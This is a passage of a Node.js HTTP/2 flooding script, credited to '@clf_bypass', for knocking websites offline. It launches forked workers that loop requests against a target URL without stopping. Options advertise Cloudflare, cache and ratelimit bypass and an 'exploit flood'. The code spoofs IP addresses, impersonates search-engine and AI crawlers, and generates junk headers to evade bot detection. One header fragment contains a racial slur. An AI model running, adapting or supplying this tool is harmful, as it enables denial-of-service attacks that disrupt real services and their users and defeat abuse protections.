    cipher() { return defaultCipherSuites[Math.floor(Math.random() * defaultCipherSuites.length)]; },
    sigalgs() { return sigalgs.split(":")[Math.floor(Math.random() * sigalgs.split(":").length)]; },
    ecdh() { return ecdh.split(":")[Math.floor(Math.random() * ecdh.split(":").length)]; }
};
process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
}).setMaxListeners(0);

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
let rps = process.argv[5];

if (!target || !time || !thread || !rps) {
    console.clear();
    console.log(`
Method with luv by @clf_bypass - 01/06/2026        
Usage: node js-h2.js url time threads rps [--options]
Options:
  --status          Show status code
  --query           Enable cache bypass
  --bfm             Enable Cloudflare bypass cookies
  --fakebot         Enable real bot behaviours
  --ratelimit       Enable ratelimit bypass
  --randpath        Enable random paths
  --exploit         Enable exploit flood
`);
    process.exit(1);
}

if (!/^https?:\/\//i.test(target)) {
    process.exit(1);
}

if (isNaN(rps) || rps <= 0) {
    process.exit(1);
}

let randbyte = 1;
setInterval(() => {
    randbyte++;
}, 1000);

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'application/json,text/html;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'application/json,application/xml;q=0.9,text/html;q=0.8,*/*;q=0.7',
    'application/json;q=0.9,application/xml;q=0.8,*/*;q=0.7',
    'text/plain;q=0.9,text/html;q=0.8,*/*;q=0.7',
    'application/pdf,text/html;q=0.8,*/*;q=0.7',
    'image/avif,image/webp,image/apng,image/png,image/jpeg,*/*;q=0.8',
    'text/html,application/xhtml+xml;q=0.8,image/avif,image/webp,*/*;q=0.7',
    'text/html,application/xhtml+xml;q=0.9,image/avif,image/webp,image/png,*/*;q=0.8',
    '*/*;q=0.8'
];
const language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8'
];
const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];
const encoding_header = ['gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, identity'];
function randomversion(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
const ver = randomversion(133, 135);

const mixua = [
    'TelegramBot (like TwitterBot)',
    'GPTBot/1.0 (+https://openai.com/gptbot)',
    'GPTBot/1.1 (+https://openai.com/gptbot)',
    'OAI-SearchBot/1.0 (+https://openai.com/searchbot)',
    'ChatGPT-User/1.0 (+https://openai.com/bot)',
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Googlebot-Image/1.0',
    'Googlebot-Video/1.0',
    'Googlebot-News/2.1',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/W.X.Y.Z Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Twitterbot/1.0',
    'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
    'Slackbot',
    'Discordbot/2.0 (+https://discordapp.com)',
    'DiscordBot (private use)',
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
];

const botUserAgents = [
    'TelegramBot (like TwitterBot)',
    'GPTBot/1.0 (+https://openai.com/gptbot)',
    'GPTBot/1.1 (+https://openai.com/gptbot)',
    'OAI-SearchBot/1.0 (+https://openai.com/searchbot)',
    'ChatGPT-User/1.0 (+https://openai.com/bot)',
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Googlebot-Image/1.0',
    'Googlebot-Video/1.0',
    'Googlebot-News/2.1',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/W.X.Y.Z Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Twitterbot/1.0',
    'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
    'Slackbot',
    'Discordbot/2.0 (+https://discordapp.com)',
    'DiscordBot (private use)',
    'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
    'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
    'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)',
    'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
    'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)'
];

function randomFirefoxVersion() {
    return `${randomversion(133, 138)}.0`;
}
function randomOS() {
    const osOptions = [
        `Windows NT 10.0; Win64; x64`,
        `Macintosh; Intel Mac OS X 14_${randomversion(0, 4)}`,
        `X11; Linux x86_64`
    ];
    return osOptions[Math.floor(Math.random() * osOptions.length)];
}
function randomSecChUa() {
    const version = parseInt(randomFirefoxVersion());
    return `"Not A;Brand";v="8", "Chromium";v="${version}", "Firefox";v="${version}"`;
}
function randomSecChUaPlatform() {
    const os = randomOS();
    if (os.startsWith('Windows')) return '"Windows"';
    if (os.startsWith('Macintosh')) return '"macOS"';
    return '"Linux"';
}
const plat = [
    "\"Windows\"",
    "\"Linux\"",
    "\"Android\"",
    "\"iOS\"",
    "\"Mac OS\"",
    "\"iPadOS\"",
    "\"BlackBerry OS\"",
    "\"Firefox OS\""
];
const searchEngines = [
    'https://www.google.com',
    'https://www.bing.com',
    'https://search.yahoo.com',
    'https://www.duckduckgo.com',
    'https://www.baidu.com',
    'https://www.yandex.com',
    'https://www.ecosia.org',
    'https://www.qwant.com',
    'https://www.startpage.com',
    'https://www.ask.com'
];
const randomEngine = searchEngines[Math.floor(Math.random() * searchEngines.length)];
const urihost = [
    'google.com',
    'youtube.com',
    'facebook.com',
    'baidu.com',
    'wikipedia.org',
    'twitter.com',
    'amazon.com',
    'yahoo.com',
    'reddit.com',
    'netflix.com'
];
const ignoreList = ['apps', 'docs', 'rate-limit-test', 'rss'];
let statusCounts = {};

const countStatus = (status) => {
    if (!statusCounts[status]) {
        statusCounts[status] = 0;
    }
    statusCounts[status]++;
};



function response(res) {
    const status = res[':status']
    countStatus(status)
}
function generateRandomString(minLength, maxLength) {
    const characters = 'aqwertyuiopsdfghjlkzxcvbnm';
    if (minLength > maxLength) {
        [minLength, maxLength] = [maxLength, minLength];
    }
    const length = minLength === maxLength ? minLength : Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}
function generateRandomStrings(minLength, maxLength) {
    const characters = 'aqwertyuiopsdfghjlkzxcvbnm';
    if (minLength > maxLength) {
        [minLength, maxLength] = [maxLength, minLength];
    }
    const length = minLength === maxLength ? minLength : Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}
const getUniqueHeaders = (function() {
    const adjectives = ['fast', 'quick', 'silent', 'noisy', 'bright', 'dark', 'calm', 'rough', 'smooth', 'fierce'];
    const nouns = ['eagle', 'tiger', 'lion', 'shark', 'wolf', 'panther', 'falcon', 'leopard', 'puma', 'cobra'];
    const suffixes = ['settings-', 'application-'];
    let pool = [];
    adjectives.forEach(adj => {
        nouns.forEach(noun => {
            suffixes.forEach(suffix => {
                pool.push(`${adj}-${noun}-${suffix}` + generateRandomString(5, 5));
            });
        });
    });
    pool.sort(() => Math.random() - 0.5);
    return function() {
        const shuffled = pool.slice().sort(() => Math.random() - 0.5);
        const selected = shuffled.slice(0, 3);
        const headers = {};
        selected.forEach(headerName => {
            const codeSnippet = `console.log('Header ${headerName}');`;
            const hexCode = Buffer.from(codeSnippet, 'utf8').toString('hex');
            headers[headerName] = hexCode;
        });
        return headers;
    };
})();

const argsList = process.argv.slice(2);
const hasFlag = (flag) => argsList.includes(flag);

const enableStatus = hasFlag('--status');
const enableRatelimit = hasFlag('--ratelimit');
const enableQuery = hasFlag('--query');
const enableRedirect = hasFlag('--redirect');
const enableFakebot = hasFlag('--fakebot');
const enableBfm = hasFlag('--bfm');
const enableRandPath = hasFlag('--randpath');
const enableExploit = hasFlag('--exploit');

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
const interval = randomDelay(500, 1000);
const ip_spoof = () => {
    const getRandomByte = () => Math.floor(Math.random() * 255);
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};
const ipsent = ['127.0.0.1', '192.168.3.100', '8.8.8.8'];
const ipsentdata = ipsent[Math.floor(Math.random() * ipsent.length)];
function getRandomPrivateIP() {
    const privateIPRanges = [
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16"
    ];
    const randomIPRange = privateIPRanges[Math.floor(Math.random() * privateIPRanges.length)];
    const ipParts = randomIPRange.split("/");
    const ipPrefix = ipParts[0].split(".");
    const subnetMask = parseInt(ipParts[1], 10);
    for (let i = 0; i < 4; i++) {
        if (subnetMask >= 8) {
            ipPrefix[i] = Math.floor(Math.random() * 256);
        } else if (subnetMask > 0) {
            const remainingBits = 8 - subnetMask;
            const randomBits = Math.floor(Math.random() * (1 << remainingBits));
            ipPrefix[i] &= ~(255 >> subnetMask);
            ipPrefix[i] |= randomBits;
            subnetMask -= remainingBits;
        } else {
            ipPrefix[i] = 0;
        }
    }
    return ipPrefix.join(".");
}
function getRandomUUID() {
    return uuidv4();
}

const legitIP = generateLegitIP();
function randIPv4() {
    let address;
    do {
        const firstOctet = getRandomInt(1, 224);
        if (
            firstOctet === 0 ||
            firstOctet === 10 ||
            firstOctet === 100 ||
            firstOctet === 127 ||
            firstOctet === 169 ||
            firstOctet === 172 ||
            firstOctet === 192 ||
            firstOctet === 198 ||
            firstOctet === 203
        ) {
            continue;
        }
        if (firstOctet >= 224 && firstOctet <= 239) {
            continue;
        }
        address = firstOctet + '.' + getRandomInt(1, 256) + '.' + getRandomInt(1, 256) + '.' + getRandomInt(1, 256);
    } while (!address);
    return address;
}
const backoffStrategies = {
    async fixed(attempt) { await sleep(1000); },
    async linear(attempt) { await sleep(1000 * attempt); },
    async exponential(attempt) { await sleep(Math.min(10000, 500 * Math.pow(2, attempt))); },
    async exponentialJitter(attempt) { await sleep(Math.min(10000, 500 * Math.pow(2, attempt) * (0.5 + Math.random() * 0.5))); },
    async fibonacci(attempt) {
        let [a, b] = [0, 1];
        for (let i = 0; i < attempt; i++) [a, b] = [b, a + b];
        await sleep(Math.min(10000, 1000 * b));
    },
    async polynomial(attempt) { await sleep(Math.min(10000, 500 * Math.pow(attempt, 2))); },
    async retryAfter(attempt, retryAfter) { await sleep(retryAfter || 1000); }
};
const backoffConfig = {
    on429: ["fixed", "linear", "exponential", "exponentialJitter", "fibonacci", "polynomial", "retryAfter"],
    onRedirect: "fixed",
    onGoaway: "exponentialJitter"
};

async function applyBackoff(strategy, attempt, retryAfter = null) {
    if (Array.isArray(strategy)) {
        const selectedStrategy = strategy[Math.floor(Math.random() * strategy.length)];
        await backoffStrategies[selectedStrategy](attempt, retryAfter);
    } else {
        await backoffStrategies[strategy](attempt, retryAfter);
    }
}
if (cluster.isMaster) {
    if (enableStatus) console.log(`[STATUS]: Enabled`);
    if (enableRatelimit) console.log(`[RATELIMIT]: Enabled`);
    if (enableQuery) console.log(`[QUERY]: Enabled`);
    if (enableRandPath) console.log(`[RANDPATH]: Enabled`);
    if (enableBfm) console.log(`[BFM]: Enabled`);
    if (enableFakebot) console.log(`[FAKEBOT]: Enabled`);
    if (enableExploit) console.log(`[EXPLOIT]: Enabled`);

    setTimeout(() => {
        console.clear();
    }, 2000);

    for (let i = 0; i < thread; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(-1);
    }, time * 1000);
} else {
    const startTime = Date.now();
    const totalSeconds = parseInt(time, 10);

    const printStatusCounts = () => {
        const elapsed = Math.ceil((Date.now() - startTime) / 1000);
        if (elapsed > totalSeconds) return;

        const entries = Object.entries(statusCounts).sort((a, b) => a[0] - b[0]);
        const parts = entries.map(([code, count]) => {
            let codeColor;
            if (code.startsWith('2')) codeColor = 'green';
            else if (code.startsWith('4')) codeColor = 'red';
            else if (code.startsWith('5')) codeColor = 'magenta';
            else codeColor = 'white';
            return `'${colors[codeColor](code)}': ${colors.yellow(count)}`;
        });

        const output = `(${elapsed}/${totalSeconds}) { ${parts.join(', ')} }`;
        console.log(output);

        Object.keys(statusCounts).forEach(status => {
            statusCounts[status] = 0;
        });
    };

    if (enableStatus) {
        setInterval(printStatusCounts, 1000);
    }

    async function floodLoop() {
        while (true) {
            await flood().catch(() => {});
            await new Promise(resolve => setImmediate(resolve));
        }
    }
    floodLoop().catch(() => {});
}

function generateRandomPathList() {
    const prefixes = [
        "", "admin", "wp-admin", "login", "api", "user", "dashboard", "static", "assets",
        "images", "css", "js", "upload", "download", "public", "private", "auth", "secure",
        "panel", "control", "adminpanel", "cms", "blog", "post", "category", "product",
        "item", "shop", "cart", "checkout", "profile", "settings", "config", "system"
    ];
    const paths = new Set();
    while (paths.size < 50) {
        let prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        let ext = pathii[Math.floor(Math.random() * pathii.length)];
        let path;
        if (prefix === "") {
            path = "/" + randstr(5) + ext;
        } else {
            path = "/" + prefix + ext;
            if (Math.random() > 0.5) {
                path = "/" + prefix + "/" + randstr(3) + ext;
            }
        }
        paths.add(path);
    }
    return Array.from(paths);
}

const randomPaths = generateRandomPathList();

async function flood() {
    let parsed = url.parse(target);
    const currentTime = Date.now();
    maprate = maprate.filter(limit => currentTime - limit.timestamp <= 60000);
    
    const spoofed = ip_spoof();
    const legitIP = generateLegitIP();
    const post = null;
    const querylenght = "1-1";
    let cacheBypassResult = { headers: {}, queryString: '', fullPath: null };
    
    let basePath = parsed.path;
    if (enableRandPath) {
        basePath = randomPaths[Math.floor(Math.random() * randomPaths.length)];
        if (!enableQuery) {
            const originalQuery = parsed.search || "";
            basePath = basePath + originalQuery;
        }
    }
    
    if (enableQuery) {
        const pathForCache = enableRandPath ? basePath.split('?')[0] : parsed.path;
        cacheBypassResult = bypassCache(parsed.host, pathForCache);
    }
    
    const datalog = [
        {[eko(1,2)+'-x-fetch-site--sytnc'+eko(1,2)+'--'+eko(2,4)]: '-wp-context-'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-x-fetch-mode--cdp'+eko(1,2)+'--'+eko(2,4)]: 'PK-'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-x-fetch-user--ukn'+eko(1,2)+'--'+eko(2,4)]: '<atset>>'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-x-fetch-dest--fo'+eko(1,2)+'--'+eko(2,4)]: '@ogani-'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-accept-encoding--ufo'+eko(1,2)+'--'+eko(2,4)]: 'POOILER|POOI|'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-accept-language--nigga'+eko(1,2)+'--'+eko(2,4)]: 'xpath-acc'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-x-botnet-close--ca'+eko(1,2)+'--'+eko(2,4)]: "rendercaching"+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-x-session-floor--pp'+eko(1,2)+'--'+eko(2,4)]: 'YY&'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-x-forwarded-for-data--'+eko(1,2)+'--'+eko(2,4)]: 'Underclass|'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-cf-emty-log-'+eko(1,2)+'--'+eko(2,4)]: 'legit-gojection'+eko(1,2)+'-'+eko(1,2)}
    ];
    let mixx;
if (enableFakebot) {
    mixx = botUserAgents[Math.floor(Math.random() * botUserAgents.length)];
} else {
    mixx = mixua[Math.floor(Math.random() * mixua.length)];
}
    let path = parsed.path;
    if (parsed.path.includes('%rand%')) {
        path = parsed.path.replace("%rand%", generateRandomString(5, 7));
    } else {
        setInterval(() => {
            path = parsed.path;
        }, 1000);
    }
    
    if (enableQuery && cacheBypassResult.fullPath) {
        path = cacheBypassResult.fullPath;
        const clickIdParams = generateClickIdParams();
        if (path.includes('?')) {
            path += clickIdParams;
        } else {
            path += '?' + clickIdParams.substring(1);
        }
    } else if (enableRandPath && !enableQuery) {
        path = basePath;
    } else if (!enableQuery && !enableRandPath) {
        path = parsed.path;
    }
    
async function reswritedata(request) {
    let size = bigRaw ? 256 * 1024 : 512 * 1024; 
    const chunkCount =  1;
    const chunkSize = Math.floor(size / chunkCount);

    const rawData = crypto.randomBytes(chunkSize);
    for (let i = 0; i < chunkCount; i++) {
        request.write(rawData);
    }
}
    let pathrr = "/" + generateRandomString(5, 7) + "/" + generateRandomString(5, 7) + randomPath;
    let header = {
        "Sec-Ch-Ua": randomSecChUa(),
       "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": randomSecChUaPlatform(),
        ...(Math.random() < 0.5 ? { "purpose": "prefetch" } : {}),
       ...(Math.random() < 0.5 ? { "upgrade-insecure-requests": "1" } : {}),
        "User-Agent":  mixx,
        ...(Math.random() < 0.5 ? { "priority": "u=0, i" } : {}),
        "Accept": accept_header[Math.floor(Math.random() * accept_header.length)],
        "Accept-Encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
        "Accept-Language": language_header[Math.floor(Math.random() * language_header.length)],
        "Sec-Fetch-Site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
        "Sec-Fetch-Mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
         "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
        ...(Math.random() < 0.677897878878 ? { "Sec-Xdp-Floodgates": "bet-clc-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.365656 ? datalog[Math.floor(Math.random() * datalog.length)] : { "xyz-nel-navigator": "null" }),
        ...(Math.random() < 0.365654 ? datalog[Math.floor(Math.random() * datalog.length)] : { "xyz-connection-navigator": "type@wifi" }),
        ...(Math.random() < 0.3656546 ? datalog[Math.floor(Math.random() * datalog.length)] : { "tcp/ip=-protocol--/-/-/---": "not-/-/--smftp" }),
        ...(Math.random() < 0.556656 ? { ['xyz-ethernetads-sys-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) } : {}),
        ...(Math.random() < 0.6767676767 ? { "Purpure-Secretf-Id": "formula-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.6 ? { [generateRandomString(1, 2) + "-SElF-DYNAMIC-" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.678787878787 ? { ["HTTP-requests-with-unusual-HTTP-headers-or-URI-path-" + generateRandomString(1, 2)]: "Router-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.6799898989899 ? { ["Java-X-Xdp" + generateRandomString(1, 2)]: "####////X-not-Tl-s-F--" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.67232323343 ? { ["Root-User" + generateRandomString(1, 2)]: "April-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.674343434434 ? { ["Sys-NodeJs-" + generateRandomString(1, 2)]: "Router-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.83434343434 ? { "Origin": Math.random() < 0.2 ? "https://" + urihost[Math.floor(Math.random() * urihost.length)] + (Math.random() < 0.2 ? ":" + getRandomInt(1, 9999) + '/' : '@root/') : "https://" + (Math.random() < 0.2 ? 'root-admin.' : 'root-root.') + randomEngine } : {}),
        ...(Math.random() < 0.55445545455454 ? { ['X-Sec-Width-From-' + generateRandomString(1, 2)]: generateRandomString(1, 2) + '-' + generateRandomString(1, 2) + '=' + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.554545454545 ? { ['User-X-With-' + generateRandomString(1, 2)]: generateRandomString(1, 2) + '-' + generateRandomString(1, 2) + '-' + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.67434343434343 ? { ['X-C-Python-' + generateRandomString(1, 2)]: generateRandomString(1, 2) + '-' + generateRandomString(1, 2) + '=' + generateRandomString(1, 2) } : {})
    }.shuffle();
    if (enableQuery && cacheBypassResult.headers) {
        header = { ...header, ...cacheBypassResult.headers };
    }
    
    if (enableBfm) {
        const bfmCookies = generateBfmCookies();
        if (header["cookie"]) {
            header["cookie"] = header["cookie"] + "; " + bfmCookies;
        } else {
            header["cookie"] = bfmCookies;
        }
    }

    const webglRenderers = [
        "ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11-0)",
        "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0, D3D11)",
        "ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0, D3D11)",
        "ANGLE (Apple, Apple M1 Pro Metal Renderer)",
        "Google Inc. (Intel) - ANGLE (Intel, Intel(R) Iris(TM) Plus Graphics, OpenGL 4.1)",
        "ANGLE (NVIDIA, NVIDIA GeForce GTX 1080 Direct3D11 vs_5_0 ps_5_0)",
        "ANGLE (ARM, Mali-G78, OpenGL ES 3.2)",
        "Adreno (TM) 650",
        "Apple GPU",
        "llvmpipe (LLVM 14.0.0, 256 bits)",
        "ANGLE (Qualcomm, Adreno (TM) 640, OpenGL ES 3.2)",
        "ANGLE (Google, Vulkan 1.3.0 (SwiftShader Device (Subzero)), SwiftShader driver)",
        "ANGLE (Intel Inc., Intel(R) UHD Graphics 630, OpenGL 4.6)",
        "ANGLE (NVIDIA Corporation, NVIDIA GeForce RTX 2080 Ti, OpenGL 4.6)",
        "ANGLE (AMD, AMD Radeon Pro 5500M, OpenGL 4.6)"
    ];
    const randomWebGL = webglRenderers[Math.floor(Math.random() * webglRenderers.length)];
    
    const screenSizes = [
        { width: 1366, height: 768, availWidth: 1366, availHeight: 728, colorDepth: 24, pixelDepth: 24 },
        { width: 1920, height: 1080, availWidth: 1920, availHeight: 1040, colorDepth: 30, pixelDepth: 30 },
        { width: 2560, height: 1440, availWidth: 2560, availHeight: 1400, colorDepth: 24, pixelDepth: 24 },
        { width: 3840, height: 2160, availWidth: 3840, availHeight: 2100, colorDepth: 30, pixelDepth: 30 },
        { width: 1440, height: 900, availWidth: 1440, availHeight: 860, colorDepth: 24, pixelDepth: 24 },
